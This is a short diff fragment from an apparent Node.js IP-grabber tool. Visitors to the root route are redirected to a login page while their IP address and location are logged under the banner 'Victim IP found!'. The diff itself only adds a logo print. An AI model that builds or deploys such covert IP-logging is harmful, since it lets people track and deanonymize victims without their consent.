@@ -81,6 +81,7 @@ app.all("/", async (req, res) => {
 	res.redirect("login");
 	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
 		console.clear();
+		console.log(logLogo);
 		console.log(chalk.greenBright`${logSuccess} Victim IP found!\n`);
 
 		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP                   :  ${ip}`);
